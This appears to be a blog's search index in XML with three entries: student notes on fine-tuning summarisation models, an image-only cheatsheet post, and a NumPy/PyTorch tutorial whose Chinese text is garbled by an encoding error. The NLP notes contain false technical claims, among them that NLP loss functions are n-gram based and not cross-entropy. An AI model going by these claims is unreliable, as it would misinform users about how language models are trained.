<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>fine-tuning_NLP</title>
      <link href="/2025/08/26/COMP9444/fine-tuning-NLP/"/>
      <url>/2025/08/26/COMP9444/fine-tuning-NLP/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#background">Background</a></li><li><a href="#task-purpose">Task purpose</a><ul><li><a href="#extractive">Extractive</a></li><li><a href="#abstractive">Abstractive</a></li></ul></li><li><a href="#metrics">Metrics</a></li><li><a href="#preliminary-research">preliminary research</a></li><li><a href="#gpu-platform-choice">GPU platform choice</a></li><li><a href="#loss-epoch-curve">Loss-epoch curve</a></li><li><a href="#about-if-fine-tuning-affects-the-model-weights">About if fine-tuning affects the model weights</a></li><li><a href="#about-the-lossy-function-in-nlp-tasks">About the lossy function in NLP tasks</a></li><li><a href="#implementation-of-codes">Implementation of codes</a></li><li><a href="#eventual-discussion">Eventual discussion</a></li></ul><h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>This term I finished the course of <strong>COMP9444</strong>, namely <strong>Neural Network and Deep Learning</strong>. Because I found many details worthy noting and recording, I wrote the blog as my notes.</p><p>Here is the records by our teams (Although the doc is in Chinese, itâ€™s worth reading the detailed preliminary research and understanding of the massive NLP models):</p><p><a href="https://docs.google.com/document/d/1lzQlF61wC1n79bVeRHBd0fxKLCtmfZ16mlr4FCv1Tv8/edit?tab=t.v5s3j8c2vvbi">Google doc for the notes and cordinations</a></p><p>Here is our codes submitted, and the <strong>notebook</strong> (with lots of trial&amp;errors), <strong>reports</strong> (formal report submission) and <strong>readme</strong> (How to run code) contents are in the 1st directory:</p><p><a href="https://github.com/deep-neural-network/Summarization">Github Codes</a></p><p>Please pay attention to the files mentioned above, which contain lots of detailed processes and trial&amp;errors.</p><p><a href="https://docs.google.com/presentation/d/1PF2DribEeQQiMmCjENg89j4zD-C0HkL006qLA68e3_o/edit?slide=id.p3#slide=id.p3">Presentation slides</a></p><h1 id="Task-purpose"><a href="#Task-purpose" class="headerlink" title="Task purpose"></a>Task purpose</h1><p>Task: To create a deep-learning model for <strong>extractive</strong> or <strong>abstractive</strong> text summarisation on news articles. The model should aim to accurately convey the key ideas of a text concisely while maintaining coherence and being robust to different writing styles.  </p><p>According to the description of the purpose, weâ€™d better to chose one direction as our purpose from the choices between <strong>Extractive</strong> and <strong>Abstractive</strong>. </p><h2 id="Extractive"><a href="#Extractive" class="headerlink" title="Extractive"></a>Extractive</h2><p>For the extractive summarization, itâ€™s extractive from the raw article. For example, if there are several most important sentences, then they will be extracted as the summarization.</p><h2 id="Abstractive"><a href="#Abstractive" class="headerlink" title="Abstractive"></a>Abstractive</h2><p>For the abstractive summerization, itâ€™s generated by concerned third party. Just like a human uses his words to describe something happened, rather not using raw sentences from the article.</p><p>Finally, because the raw datasetâ€™s summerizations are all human-labeled abstractive summerizations, we can only focus on <strong>abstractive summerization</strong>, rather not the <strong>extractive summerization</strong>.</p><h1 id="Metrics"><a href="#Metrics" class="headerlink" title="Metrics"></a>Metrics</h1><p>ROUGE-1 (overlap of unigrams/words)</p><p>ROUGE-2 (overlap of bigrams/two-word phrases)</p><p>ROUGE-L (longest common subsequence, measuring fluency and ordering)</p><p>Proposed Metric(Junadhi Metric)</p><p>BERTScore(semantic similarity)</p><p>BARTScore(semantic similarity)</p><h1 id="preliminary-research"><a href="#preliminary-research" class="headerlink" title="preliminary research"></a>preliminary research</h1><p>RAGFlow</p><p>facebook/bart-large-cnn</p><p>google/pegasus-cnn_dailymail</p><p>facebook/bart-large</p><p>google/pegasus-large</p><p>pegasus-x-base</p><p>bert-extractive-summarizer</p><p>and so on.</p><h1 id="GPU-platform-choice"><a href="#GPU-platform-choice" class="headerlink" title="GPU platform choice"></a>GPU platform choice</h1><p>Firstly I used <strong>Tesla4T</strong> to train, but itâ€™s really time-consuming in such low computation device. We need to spend 3 days to train only 2 epochs.</p><p>Then I found, the authentic graphic cards are not convenient. Itâ€™s better to choose the <strong>vast.ai</strong> directly. Besides, I suggest that you donâ€™t need to upload from local to vast cloud, itâ€™s slow. Vast cloud can download the hugging-face datasets in several Giga Bytes in only 10 seconds!</p><h1 id="Loss-epoch-curve"><a href="#Loss-epoch-curve" class="headerlink" title="Loss-epoch curve"></a>Loss-epoch curve</h1><p>The loss-epoch must be similiar to <strong>Exponential decay curve</strong>. If the loss descends too rapidly, I guess its tokenization or paddings got wrong.</p><p>Because the neural networkâ€™s training outcome must be a continueous curve, too rapid peak menas something wired.</p><h1 id="About-if-fine-tuning-affects-the-model-weights"><a href="#About-if-fine-tuning-affects-the-model-weights" class="headerlink" title="About if fine-tuning affects the model weights"></a>About if fine-tuning affects the model weights</h1><p>Yes, we know fine-tuning can change the initial model directly. Usually it freezes the most middle layers of the network, and just be fine-tunned in several first layers and last layers. </p><p>Because you just need to let model reach the expectation slightly, based on its base model.<br>You donâ€™t need to change the initial weights massively.</p><h1 id="About-the-lossy-function-in-NLP-tasks"><a href="#About-the-lossy-function-in-NLP-tasks" class="headerlink" title="About the lossy function in NLP tasks"></a>About the lossy function in NLP tasks</h1><p>In graphic tasks, the loss functions are usually <strong>Cross-Entropy Loss</strong>.</p><p>But in NLP models, they are obviously not. NLP lossy functions are usually n-grams, there is no semantic loss, and 2-gram is usual in most NLP models. Hence they donâ€™t have good perfermance on understanding of the raw articles.</p><p>Of course, we used our own metrics to evaluate the validation datasets, but which doesnâ€™t mean that the metrics are applicable in the lossy functions.</p><h1 id="Implementation-of-codes"><a href="#Implementation-of-codes" class="headerlink" title="Implementation of codes"></a>Implementation of codes</h1><p>We didnâ€™t pay much attention to codes, because itâ€™s simple. Just take care of the tokenizations and the paddings, just debug the model frequently.</p><p><a href="https://github.com/deep-neural-network/Summarization">Github Codes</a></p><h1 id="Eventual-discussion"><a href="#Eventual-discussion" class="headerlink" title="Eventual discussion"></a>Eventual discussion</h1><p>Here you can refer to the disscussions of limitation in notebook or reports.</p><p>We found the NLP models donâ€™t have emotion to analyze which sentence is much worthy reading. For example, if there are sentences about <strong>death</strong>, usually human-beings will pay attention to these emphysized sentences. </p><p>However, the machine could only focus on itâ€™s 2-gram loss function, and may prefer the informative sentences, because they cover much.</p><p>Hence we think there should be some weights of emotions as several layers in the deep-learning network. So they can improve the simulations as a real emotional humans.</p>]]></content>
      
      
      <categories>
          
          <category> COMP9444 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Big-data-management-cheatsheat</title>
      <link href="/2025/08/25/COMP9313/cheatsheat/"/>
      <url>/2025/08/25/COMP9313/cheatsheat/</url>
      
        <content type="html"><![CDATA[<h1 id="My-comp9313-cheatsheat"><a href="#My-comp9313-cheatsheat" class="headerlink" title="My comp9313 cheatsheat"></a>My comp9313 cheatsheat</h1><p><img src="/2025/08/25/COMP9313/cheatsheat/1000008349.jpg" alt></p><p><img src="/2025/08/25/COMP9313/cheatsheat/1000008350.jpg" alt></p>]]></content>
      
      
      <categories>
          
          <category> COMP9313 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>tut1-numpy+tensor+colab</title>
      <link href="/2025/06/10/COMP9444/numpy/"/>
      <url>/2025/06/10/COMP9444/numpy/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#numpyæ–‡æ¡£">NumPyæ–‡æ¡£</a></li><li><a href="#æ•°ç»„åˆ›å»º">æ•°ç»„åˆ›å»º</a><ul><li><a href="#nprandomrandom---------------------åˆ›å»ºéšæœºæ•°ç»„">np.random.random                     åˆ›å»ºéšæœºæ•°ç»„</a></li></ul></li><li><a href="#array-indexing"><strong>Array Indexing</strong></a><ul><li><a href="#åˆ‡ç‰‡ç´¢å¼•">åˆ‡ç‰‡ç´¢å¼•</a></li><li><a href="#æ•°ç»„å†…æ•°ç»„é€‰å–">æ•°ç»„å†…æ•°ç»„é€‰å–</a><ul><li><a href="#arange">arange</a></li></ul></li><li><a href="#å¸ƒå°”ç´¢å¼•æ“ä½œ">å¸ƒå°”ç´¢å¼•æ“ä½œ</a></li></ul></li><li><a href="#datatypes">Datatypes</a></li><li><a href="#array-math"><strong>Array Math</strong></a><ul><li><a href="#åŠ ">åŠ </a></li><li><a href="#å‡">å‡</a></li><li><a href="#ä¹˜">ä¹˜</a></li><li><a href="#é™¤">é™¤</a></li><li><a href="#å¼€æ–¹">å¼€æ–¹</a></li><li><a href="#ç‚¹ä¹˜å‘é‡å†…ç§¯">ç‚¹ä¹˜ï¼ˆå‘é‡å†…ç§¯ï¼‰</a><ul><li><a href="#ä¸€ç»´å‘é‡ä¸ä¸€ç»´å‘é‡çš„å†…ç§¯ä¸å¤–ç§¯">ä¸€ç»´å‘é‡ä¸ä¸€ç»´å‘é‡çš„å†…ç§¯ä¸å¤–ç§¯</a><ul><li><a href="#ä¸¤ä¸ªä¸€ç»´å‘é‡è¿›è¡Œ-dotç‚¹ä¹˜">ä¸¤ä¸ªä¸€ç»´å‘é‡è¿›è¡Œ dotï¼ˆç‚¹ä¹˜ï¼‰</a></li><li><a href="#æƒ³è¿›è¡ŒçŸ©é˜µä¹˜æ³•è¦æ˜ç¡®è½¬æ¢ç»´åº¦"><strong>æƒ³è¿›è¡ŒçŸ©é˜µä¹˜æ³•</strong>ï¼Œè¦æ˜ç¡®è½¬æ¢ç»´åº¦</a></li><li><a href="#å¤–ç§¯outer-product">å¤–ç§¯ï¼ˆOuter Productï¼‰</a></li><li><a href="#å†…ç§¯è¡Œå‘é‡--åˆ—å‘é‡--æ ‡é‡">å†…ç§¯ï¼ˆè¡Œå‘é‡ Ã— åˆ—å‘é‡ â†’ æ ‡é‡ï¼‰</a></li></ul></li></ul></li></ul></li><li><a href="#transpose">transpose</a></li><li><a href="#broadcasting"><strong>Broadcasting</strong></a><ul><li><a href="#å…³äºrank-ç§©">å…³äºrank ç§©</a></li><li><a href="#pyçš„é€è¡Œç›¸åŠ ä¸æ¨èæ…¢">pyçš„é€è¡Œç›¸åŠ ï¼ˆä¸æ¨èã€æ…¢ï¼‰</a></li><li><a href="#æ‰©å¼ è¾ƒå°rankå†çŸ©é˜µç›¸åŠ ä¹Ÿä¸æ¨èå› ä¸ºå¹¶éæœ€ä¼˜å†™æ³•">æ‰©å¼ è¾ƒå°rankå†çŸ©é˜µç›¸åŠ ï¼ˆä¹Ÿä¸æ¨èï¼Œå› ä¸ºå¹¶éæœ€ä¼˜å†™æ³•ï¼‰</a></li><li><a href="#ä½¿ç”¨npè‡ªå¸¦çš„å¹¿æ’­ç›¸åŠ ">ä½¿ç”¨npè‡ªå¸¦çš„å¹¿æ’­ç›¸åŠ </a></li><li><a href="#1----------3---------3---------æ˜¯å°ºå¯¸ç›¸åŒ">1          3         3         æ˜¯ï¼ˆå°ºå¯¸ç›¸åŒï¼‰</a></li><li><a href="#2----------5----------1----------æ˜¯bæ²¿è¯¥ç»´åº¦å¹¿æ’­æ‰©å±•5æ¬¡">2          5          1          æ˜¯ï¼Œbæ²¿è¯¥ç»´åº¦å¹¿æ’­æ‰©å±•5æ¬¡</a><ul><li><a href="#ä»£ç ç¤ºä¾‹">ä»£ç ç¤ºä¾‹</a></li><li><a href="#æ”¹ä¸€ç»´å‘é‡çš„ç§©è¿›è¡Œå¹¿æ’­çš„ç¤ºä¾‹">æ”¹ä¸€ç»´å‘é‡çš„ç§©è¿›è¡Œå¹¿æ’­çš„ç¤ºä¾‹</a></li></ul></li></ul></li><li><a href="#matplotlib">Matplotlib</a><ul><li><a href="#plotåŸºæœ¬ç”»å›¾">plotï¼šåŸºæœ¬ç”»å›¾</a></li><li><a href="#multiple-functions"><em>Multiple Functions</em></a></li><li><a href="#subplotå­å›¾">SubPlotï¼šå­å›¾</a></li><li><a href="#imshow">Imshow</a></li></ul></li><li><a href="#pytorch-tensors"><strong>PyTorch Tensors</strong></a><ul><li><a href="#tensor-initialization"><strong>Tensor Initialization</strong></a><ul><li><a href="#æ£€æŸ¥æ•°æ®ç±»å‹">æ£€æŸ¥æ•°æ®ç±»å‹</a></li><li><a href="#æ£€æŸ¥shape">æ£€æŸ¥shape</a></li><li><a href="#å½¢çŠ¶å˜åŠ¨">å½¢çŠ¶å˜åŠ¨</a></li></ul></li><li><a href="#tensor-from-a-numpy-array"><em>Tensor from a Numpy Array</em></a></li><li><a href="#from-existing-tensor"><strong>From existing Tensor</strong></a><ul><li><a href="#code">Code</a></li></ul></li><li><a href="#torchéšæœºæ•°randå’Œrandn">Torchéšæœºæ•°randå’Œrandn</a></li><li><a href="#å½¢çŠ¶--å®ä¾‹åŒ–å¼ é‡"><strong>å½¢çŠ¶â€”>å®ä¾‹åŒ–ğŸ¡ªå¼ é‡</strong></a><ul><li><a href="#æ ¹æ®shapeåˆå§‹åŒ–">æ ¹æ®shapeåˆå§‹åŒ–</a></li><li><a href="#ç›´æ¥arangeç”Ÿæˆä¸€ç»´æ•°ç»„">ç›´æ¥arangeç”Ÿæˆä¸€ç»´æ•°ç»„</a></li></ul></li><li><a href="#æŒ‡å®šè®¾å¤‡å­˜å‚¨å¼ é‡ä¸ºä½•tensorå¿…é¡»æŒ‡å®šè®¾å¤‡">æŒ‡å®šè®¾å¤‡å­˜å‚¨å¼ é‡ï¼ˆä¸ºä½•tensorå¿…é¡»æŒ‡å®šè®¾å¤‡ï¼‰</a></li><li><a href="#tensoræ“ä½œ">tensoræ“ä½œ</a><ul><li><a href="#åŠ å‡ä¹˜é™¤">åŠ å‡ä¹˜é™¤</a></li><li><a href="#dot-product-and-matrix-multiplication"><em>Dot Product and Matrix Multiplication</em></a><ul><li><a href="#ç‚¹ä¹˜">ç‚¹ä¹˜</a></li><li><a href="#çŸ©é˜µä¹˜">çŸ©é˜µä¹˜</a><ul><li><a href="#ä¸‰ç§çŸ©é˜µä¹˜æ³•çš„è¡¨ç¤º"><em>ä¸‰ç§çŸ©é˜µä¹˜æ³•çš„è¡¨ç¤º</em></a></li></ul></li></ul></li><li><a href="#åˆå¹¶">åˆå¹¶</a></li></ul></li></ul></li><li><a href="#google-colab">Google colab</a><ul><li><a href="#ä»£ç pythonæ£€æŸ¥å½“å‰tensorçš„å…¨éƒ¨å¯ç”¨è®¾å¤‡">ä»£ç ï¼špythonæ£€æŸ¥å½“å‰tensorçš„å…¨éƒ¨å¯ç”¨è®¾å¤‡</a></li><li><a href="#è®¾ç½®ä»…cpu">è®¾ç½®ä»…cpu</a></li><li><a href="#è®¾ç½®tpuçš„runtime">è®¾ç½®TPUçš„runtime</a></li></ul></li></ul><h1 id="NumPyæ–‡æ¡£"><a href="#NumPyæ–‡æ¡£" class="headerlink" title="NumPyæ–‡æ¡£"></a>NumPyæ–‡æ¡£</h1><p><a href="https://numpy.org/doc/stable/user/basics.creation.html#arrays-creation">https://numpy.org/doc/stable/user/basics.creation.html#arrays-creation</a></p><h1 id="æ•°ç»„åˆ›å»º"><a href="#æ•°ç»„åˆ›å»º" class="headerlink" title="æ•°ç»„åˆ›å»º"></a>æ•°ç»„åˆ›å»º</h1><hr><p><strong>1. a = np.zeros((2,2))</strong></p><ul><li><p><strong>ä½œç”¨</strong>ï¼šåˆ›å»ºä¸€ä¸ª 2Ã—2 çš„<strong>å…¨ 0 æ•°ç»„</strong></p></li><li><p><strong>è¾“å‡ºç¤ºä¾‹</strong>ï¼š</p></li></ul><p>python</p><p>CopyEdit</p><p>[[0. 0.]</p><p>[0. 0.]]</p><hr><p><strong>2. b = np.ones((1,2))</strong></p><ul><li><p><strong>ä½œç”¨</strong>ï¼šåˆ›å»ºä¸€ä¸ª 1Ã—2 çš„<strong>å…¨ 1 æ•°ç»„</strong></p></li><li><p><strong>è¾“å‡ºç¤ºä¾‹</strong>ï¼š</p></li></ul><p>python</p><p>CopyEdit</p><p>[[1. 1.]]</p><hr><p><strong>3. c = np.full((2,2), 7)</strong></p><ul><li><p><strong>ä½œç”¨</strong>ï¼šåˆ›å»ºä¸€ä¸ª 2Ã—2 çš„æ•°ç»„ï¼Œ<strong>æ¯ä¸ªå…ƒç´ éƒ½æ˜¯ 7</strong></p></li><li><p><strong>è¾“å‡ºç¤ºä¾‹</strong>ï¼š</p></li></ul><p>python</p><p>CopyEdit</p><p>[[7 7]</p><p>[7 7]]</p><hr><p><strong>4. d = np.eye(2)</strong></p><ul><li><p><strong>ä½œç”¨</strong>ï¼šåˆ›å»ºä¸€ä¸ª 2Ã—2 çš„<strong>å•ä½çŸ©é˜µ</strong>ï¼ˆå¯¹è§’çº¿ä¸º 1ï¼Œå…¶å®ƒä¸º 0ï¼‰</p></li><li><p><strong>è¾“å‡ºç¤ºä¾‹</strong>ï¼š</p></li></ul><p>python</p><p>CopyEdit</p><p>[[1. 0.]</p><p>[0. 1.]]</p><hr><p><strong>5. e = np.random.random((2,2))</strong></p><ul><li><p><strong>ä½œç”¨</strong>ï¼šåˆ›å»ºä¸€ä¸ª 2Ã—2 çš„æ•°ç»„ï¼Œ<strong>æ¯ä¸ªå…ƒç´ æ˜¯ 0~1 çš„éšæœºå°æ•°</strong></p></li><li><p><strong>è¾“å‡ºç¤ºä¾‹</strong>ï¼ˆæ¯æ¬¡è¿è¡Œç»“æœä¸åŒï¼‰ï¼š</p></li></ul><p>python</p><p>CopyEdit</p><p>[[0.91 0.08]</p><p>[0.68 0.87]]</p><hr><p><strong>æ€»ç»“</strong></p><p>è¿™äº›æ˜¯ numpy<br>ä¸­å¸¸ç”¨çš„æ•°ç»„åˆå§‹åŒ–æ–¹æ³•ï¼Œéå¸¸é€‚åˆç”¨æ¥åˆ›å»ºçŸ©é˜µã€æµ‹è¯•æ•°æ®ã€æˆ–ç”¨äºç§‘å­¦è®¡ç®—ï¼š</p><hr><p>  <strong>å‡½æ•°</strong>                             <strong>è¯´æ˜</strong></p><hr><p>  np.zeros                             åˆ›å»ºå…¨ 0 æ•°ç»„</p><p>  np.ones                              åˆ›å»ºå…¨ 1 æ•°ç»„</p><p>  np.full                              åˆ›å»ºæŒ‡å®šå€¼çš„æ•°ç»„</p><p>  np.eye                               åˆ›å»ºå•ä½çŸ©é˜µ</p><h2 id="np-random-random-åˆ›å»ºéšæœºæ•°ç»„"><a href="#np-random-random-åˆ›å»ºéšæœºæ•°ç»„" class="headerlink" title="  np.random.random                     åˆ›å»ºéšæœºæ•°ç»„"></a>  np.random.random                     åˆ›å»ºéšæœºæ•°ç»„</h2><h1 id="Array-Indexing"><a href="#Array-Indexing" class="headerlink" title="Array Indexing"></a><strong>Array Indexing</strong></h1><h2 id="åˆ‡ç‰‡ç´¢å¼•"><a href="#åˆ‡ç‰‡ç´¢å¼•" class="headerlink" title="åˆ‡ç‰‡ç´¢å¼•"></a>åˆ‡ç‰‡ç´¢å¼•</h2><p>a = np.array([</p><p>[1,2,3,4],</p><p>[5,6,7,8],</p><p>[9,10,11,12]</p><p>])\<br>b = a[:2, 1:3]</p><p>ä¼šè¾“å‡º</p><p>[[2 3]</p><p>[6 7]]</p><p>a[<strong>:</strong> 2, 1:3]</p><p>æ‹¬å·é‡Œï¼Œ<strong>:</strong> æ˜¯è¡Œåˆ—æ“ä½œçš„åˆ†éš”ç¬¦ï¼Œå†’å·ä¹‹å‰æ˜¯ è¡Œ æ“ä½œï¼Œ å†’å·ä¹‹åæ˜¯ åˆ—<br>æ“ä½œ</p><p>a = np.array([[1,2,3,4], [5,6,7,8], [9,10,11,12]])\<br>\<br># Two ways of accessing the data in the middle row of the array.\<br># Mixing integer indexing with slices yields an array of lower\<br># rank, while using only slices yields an array of the same rank\<br># as the original array:\<br>row_r1 = <strong>a[1, :]</strong> # Rank 1 view of the second row of a\<br>row_r2 = <strong>a[1:2, :]</strong> # Rank 2 view of the second row of a\<br>print(row_r1, row_r1.shape) # Prints \â€[5 6 7 8] (4,)\â€\<br>print(row_r2, row_r2.shape) # Prints \â€[[5 6 7 8]] (1, 4)\â€</p><p><strong>[æ³¨æ„]{.mark}</strong>ï¼š<strong>åˆ‡ç‰‡</strong>ä»¥<strong>åˆ—è¡¨ä¹‹å§¿</strong>å‡ºç°ï¼š</p><p><strong>a[1, :]</strong><br>æ˜¯è¯´è®¿é—®ç¬¬1ä¸ªå…ƒç´ ï¼ˆä»0è®¡èµ·ï¼Œ1æ˜¯ç¬¬2è¡Œï¼‰ï¼ˆ<strong>éåˆ‡ç‰‡</strong>ï¼‰ï¼Œæ•…è€Œè¾“å‡º</p><p><strong>[5 6 7 8] (4,)</strong></p><p><strong>a[1:2, :]</strong> æ˜¯è¯´ç¬¬1è¡Œå…ƒç´ ï¼ˆ<strong>åˆ‡ç‰‡</strong>ï¼‰ï¼Œæ•…è€Œè¾“å‡º</p><p><strong>[[5 6 7 8]] (1, 4)</strong></p><h2 id="æ•°ç»„å†…æ•°ç»„é€‰å–"><a href="#æ•°ç»„å†…æ•°ç»„é€‰å–" class="headerlink" title="æ•°ç»„å†…æ•°ç»„é€‰å–"></a>æ•°ç»„å†…æ•°ç»„é€‰å–</h2><p>import numpy as np\<br>\<br># Create a new array from which we will select elements\<br>a = np.array([[1,2,3], [4,5,6], [7,8,9], [10, 11, 12]])\<br>\<br>print(a) # prints \â€array([[ 1, 2, 3],\<br># [ 4, 5, 6],\<br># [ 7, 8, 9],\<br># [10, 11, 12]])\â€\<br>\<br># Create an array of indices\<br>b = np.array([0, 2, 0, 1])</p><h3 id="arange"><a href="#arange" class="headerlink" title="arange"></a>arange</h3><p>x = np.<strong>arange</strong>(-10, 10)</p><p><strong>ğŸ’¡ è§£é‡Šï¼š</strong></p><ul><li><p>-10 æ˜¯èµ·å§‹å€¼ï¼ˆåŒ…å«ï¼‰</p></li><li><p>10 æ˜¯ç»ˆæ­¢å€¼ï¼ˆä¸åŒ…å«ï¼‰</p></li><li><p>é»˜è®¤æ­¥é•¿æ˜¯ 1</p></li></ul><p>æ‰€ä»¥è¿™è¡Œä»£ç ä¼šç”Ÿæˆä¸€ä¸ªä» -10 åˆ° 9 çš„æ•´æ•°æ•°ç»„ï¼š</p><p># Select one element from each row of a using the indices in b\<br>print(a[np.arange(4), b]) # Prints \â€[ 1 6 7 11]\â€\<br>\<br># Mutate one element from each row of a using the indices in b\<br># np.arange(4) ç”Ÿæˆ [0, 1, 2, 3]ï¼šå¯¹åº” 4 è¡Œçš„è¡Œç´¢å¼•\<br># b = [0, 2, 0, 1]ï¼šæ¯ä¸€è¡Œä¸­è¦é€‰æ‹©çš„åˆ—ç´¢å¼•\<br># [ç›¸å½“äºé€‰å–]{.mark}\<br># [\<br># a[0, 0], # 1\<br># a[1, 2], # 6\<br># a[2, 0], # 7\<br># a[3, 1] # 11\<br># ]</p><p>a[np.arange(4), b] += 10\<br>print(a) # prints \â€array([[11, 2, 3],\<br># [ 4, 5, 16],\<br># [17, 8, 9],\<br># [10, 21, 12]])</p><h2 id="å¸ƒå°”ç´¢å¼•æ“ä½œ"><a href="#å¸ƒå°”ç´¢å¼•æ“ä½œ" class="headerlink" title="å¸ƒå°”ç´¢å¼•æ“ä½œ"></a>å¸ƒå°”ç´¢å¼•æ“ä½œ</h2><p>import numpy as np\<br>\<br>a = np.array([[1,2], [3, 4], [5, 6]])\<br>\<br># æ‹¬å·æ˜¯å¯é€‰çš„ï¼Œä¸åŠ æ‹¬å·ä¹Ÿè¡Œ\<br>[bool_idx = (a > 2)]{.mark} # Find the elements of a that are bigger<br>than 2;\<br># this returns a numpy array of Booleans of the\<br># same shape as a, where each slot of bool_idx\<br># tells whether that element of a is > 2.\<br>\<br>print(bool_idx) # Prints \â€[[False False]\<br># [ True True]\<br># [ True True]]\â€</p><p># We use boolean array indexing to construct a rank 1 array\<br># consisting of the elements of a corresponding to the\<br># True values of bool_idx\<br><strong>print(a[bool_idx]) # Prints \â€[3 4 5 6]\â€</strong>\<br>[# 1. åœ¨ bool_idx ä¸º True çš„ä½ç½®ï¼Œå–å‡ºå¯¹åº”çš„ a ä¸­çš„å…ƒç´ ã€‚\<br># 2. å°†ç»“æœå˜æˆä¸€ä¸ªä¸€ç»´æ•°ç»„è¿”å›ã€‚]{.mark}</p><p># We can do all of the above in a single concise statement:\<br><strong>print(a[a > 2]) # Prints \â€[3 4 5 6]\â€</strong></p><p>æ€»ç»“ï¼Œ<br>aæ˜¯npæ•°ç»„ï¼Œa>2æœ¬èº«å·²ç»æ˜¯ä¸€ä¸ªboolåˆ—è¡¨äº†ï¼Œç„¶åç”¨ä½œç´¢å¼•å¯ä»¥ç›´æ¥è¿‡æ»¤å‡ºç¬¦åˆå¸ƒå°”çš„å…ƒç´ ã€‚</p><h1 id="Datatypes"><a href="#Datatypes" class="headerlink" title="Datatypes"></a>Datatypes</h1><p>é»˜è®¤å°±æ˜¯ int64 å’Œ float64</p><p>import numpy as np</p><p>x = np.array([1, 2]) # Let numpy choose the datatype</p><p>print(x.dtype) # Prints \â€<strong>[int64]{.mark}</strong>\â€</p><p>x = np.array([1.0, 2.0]) # Let numpy choose the datatype</p><p>print(x.dtype) # Prints \â€<strong>[float64]{.mark}</strong>\â€</p><p>x = np.array([1, 2], dtype=np.int64) # Force a particular datatype</p><p>print(x.dtype) # Prints \â€<strong>[int64]{.mark}</strong>\â€</p><h1 id="Array-Math"><a href="#Array-Math" class="headerlink" title="Array Math"></a><strong>Array Math</strong></h1><p>import numpy as np\<br>\<br>x = np.array([[1,2],[3,4]], dtype=np.float64)\<br>y = np.array([[5,6],[7,8]], dtype=np.float64)</p><h3 id="åŠ "><a href="#åŠ " class="headerlink" title="åŠ "></a>åŠ </h3><p># Elementwise sum; both produce the array\<br># [[ 6.0 8.0]\<br># [10.0 12.0]]\<br>print(x + y)\<br>print(np.add(x, y))</p><h3 id="å‡"><a href="#å‡" class="headerlink" title="å‡"></a>å‡</h3><p># Elementwise difference; both produce the array\<br># [[-4.0 -4.0]\<br># [-4.0 -4.0]]\<br>print(x - y)\<br>print(np.subtract(x, y))</p><h3 id="ä¹˜"><a href="#ä¹˜" class="headerlink" title="ä¹˜"></a>ä¹˜</h3><p>*æ˜¯é€ä¸ªå…ƒç´ ç›¸ä¹˜ï¼Œä¸æ˜¯çŸ©é˜µä¹˜æ³•</p><p># Elementwise product; both produce the array\<br># [[ 5.0 12.0]\<br># [21.0 32.0]]\<br>print(x * y)\<br>print(np.multiply(x, y))</p><h3 id="é™¤"><a href="#é™¤" class="headerlink" title="é™¤"></a>é™¤</h3><p># Elementwise division; both produce the array\<br># [[ 0.2 0.33333333]\<br># [ 0.42857143 0.5 ]]\<br>print(x / y)\<br>print(np.divide(x, y))</p><h3 id="å¼€æ–¹"><a href="#å¼€æ–¹" class="headerlink" title="å¼€æ–¹"></a>å¼€æ–¹</h3><p># Elementwise square root; produces the array\<br># [[ 1. 1.41421356]\<br># [ 1.73205081 2. ]]\<br>print(np.sqrt(x))</p><h3 id="ç‚¹ä¹˜ï¼ˆå‘é‡å†…ç§¯ï¼‰"><a href="#ç‚¹ä¹˜ï¼ˆå‘é‡å†…ç§¯ï¼‰" class="headerlink" title="ç‚¹ä¹˜ï¼ˆå‘é‡å†…ç§¯ï¼‰"></a>ç‚¹ä¹˜ï¼ˆå‘é‡å†…ç§¯ï¼‰</h3><p>Note that * is elementwise multiplication, not matrix multiplication.<br>We instead use the dot function to compute inner products of vectors, to<br>multiply a vector by a matrix, and to multiply matrices. dot is<br>available both as a function in the numpy module and as an instance<br>method of array objects:</p><p>dot åœ¨ NumPy ä¸­ï¼Œå…¶è¡Œä¸º<strong>å–å†³äºè¾“å…¥æ•°ç»„çš„ç»´åº¦</strong>ï¼š</p><ul><li><p><strong>ä¸¤ä¸ªå‘é‡</strong>ï¼ˆä¸€ç»´æ•°ç»„ï¼‰ï¼šæ‰§è¡Œç‚¹ä¹˜ï¼ˆinner productï¼‰ã€‚</p></li><li><p><strong>çŸ©é˜µå’Œå‘é‡</strong>ï¼šæ‰§è¡ŒçŸ©é˜µä¹˜å‘é‡ã€‚</p></li><li><p><strong>ä¸¤ä¸ªçŸ©é˜µ</strong>ï¼šæ‰§è¡ŒçŸ©é˜µä¹˜æ³•ã€‚</p></li></ul><p>å¦‚æœè¦æ˜ç¡®è¿›è¡ŒçŸ©é˜µä¹˜æ³•ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ @ ä½œä¸ºè¿ç®—ç¬¦ï¼š</p><p>print(x @ v) # ç­‰ä»·äº x.dot(v)</p><p>print(x @ y) # ç­‰ä»·äº x.dot(y)</p><p>import numpy as np</p><p>x = np.array([[1,2],[3,4]])</p><p>y = np.array([[5,6],[7,8]])</p><p>v = np.array([9,10])</p><p>w = np.array([11, 12])</p><p># Inner product of vectors; both produce 219</p><p>print(<strong>v.dot(w)</strong>)</p><p>print(<strong>np.dot(v, w)</strong>)</p><p># Matrix / vector product; both produce the rank 1 array [29 67]</p><p>print(<strong>x.dot(v)</strong>)</p><p>print(<strong>np.dot(x, v)</strong>)</p><p># Matrix / matrix product; both produce the rank 2 array</p><p># [[19 22]</p><p># [43 50]]</p><p>print(x.dot(y))</p><p>print(np.dot(x, y))</p><h4 id="ä¸€ç»´å‘é‡ä¸ä¸€ç»´å‘é‡çš„å†…ç§¯ä¸å¤–ç§¯"><a href="#ä¸€ç»´å‘é‡ä¸ä¸€ç»´å‘é‡çš„å†…ç§¯ä¸å¤–ç§¯" class="headerlink" title="ä¸€ç»´å‘é‡ä¸ä¸€ç»´å‘é‡çš„å†…ç§¯ä¸å¤–ç§¯"></a>ä¸€ç»´å‘é‡ä¸ä¸€ç»´å‘é‡çš„å†…ç§¯ä¸å¤–ç§¯</h4><h5 id="ä¸¤ä¸ªä¸€ç»´å‘é‡è¿›è¡Œ-dotï¼ˆç‚¹ä¹˜ï¼‰"><a href="#ä¸¤ä¸ªä¸€ç»´å‘é‡è¿›è¡Œ-dotï¼ˆç‚¹ä¹˜ï¼‰" class="headerlink" 